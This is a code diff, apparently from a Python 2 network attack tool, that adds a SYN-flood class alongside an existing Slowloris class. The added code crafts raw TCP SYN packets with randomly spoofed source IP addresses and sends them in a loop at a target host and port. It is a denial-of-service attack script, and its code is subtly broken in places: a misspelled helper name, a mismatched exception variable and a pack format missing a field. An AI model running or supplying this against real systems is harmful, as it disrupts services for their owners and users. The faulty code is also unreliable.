@@ -81,6 +81,88 @@ class attackSYNFlood(threading.Thread):
             send(ip/tcp, verbose = 0)
 """
 
+class attackSYNFlood(threading.Thread):
+    def __init__(self, **kwargs):
+        threading.Thread.__init__(self)
+        self.timeout = kwargs['timeout']
+        self.target = kwargs['target']
+        self.port = int(kwargs['port'])
+
+    # http://stackoverflow.com/questions/1767910/checksum-udp-calculation-python
+    def _carry_around_add(self, a, b):
+        c = a + b
+        return (c & 0xffff) + (c >> 16)
+
+    def _checksum(self, msg):
+        s = 0
+        for i in xrange(0, len(msg), 2):
+            w = ord(msg[i]) + (ord(msg[i+1]) << 8)
+            s = carr_around_add(s, w)
+        return ~s & 0xffff
+
+    def run(self):
+        start = time.time()
+
+        # create the custom TCP packet
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+
+            sIP = "{0}.{1}.{2}.{3}".format(random.randint(1,254),
+                                           random.randint(1,254),
+                                           random.randint(1,254),
+                                           random.randint(1,254))
+            # IP header fields
+            version               = 4
+            ihl                   = 5
+            version_ihl           = (version << 4) + ihl
+            dscp_ecn              = 0
+            total_length          = 40
+            # not sure what to set this to?
+            identification        = 0
+            flags_fragment_offset = 0
+            ttl                   = 255
+            protocol              = socket.IPPROTO_TCP
+            checksum              = 0
+
+            ip_header = pack('!BBHHHBBH4s4s', version_ihl, dscp_ecn, total_length,
+                    identification, flags_fragment_offset, ttl, protocol, checksum,
+                    socket.inet_aton(sIP), socket.inet_aton(self.target))
+
+            # TCP header fields
+            source_port           = np.randint(1, 65535)
+            dest_port             = self.port
+            seq                   = 0
+            ack                   = 0
+            data_offset           = 5
+            data_offset_res       = (data_offset << 4) + 0
+            # this is 00000010 where we set 1 for SYN
+            tcp_flags             = 2
+            window                = socket.htons(5840)
+            checksum              = 0
+            urgent_pointer        = 0
+
+            tcp_header = pack('!HHLLBBHHH', source_port, dest_port, seq, ack,
+                    data_offset_res, tcp_flags, window, checksum, urgent_pointer)
+
+            # calculate the correct checksum
+            checksum_packet = pack('!4s4sBHH', socket.inet_aton(sIP),
+                    socket.inet_aton(self.target), 0, socket.IPPROTO_TCP,
+                    len(tcp_header))
+            checksum_packet = checksum_packet + tcp_header
+            tcp_header = pack('!HHLBBHHH', source_port, dest_port, seq, ack,
+                    data_offset_res, tcp_flags, window, _checksum(checksum_packet),
+                    urgent_pointer)
+
+            packet = ip_header + tcp_header
+        except socket.error, mgs:
+            print "Socket error: ", str(msg[0]), str(msg[1])
+
+        # flood the target
+        while time.time() - start < self.timeout:
+            s.sendto(packet, (self.target, 0))
+
+
 class attackSlowLoris(threading.Thread):
     def __init__(self, **kwargs):
         threading.Thread.__init__(self)
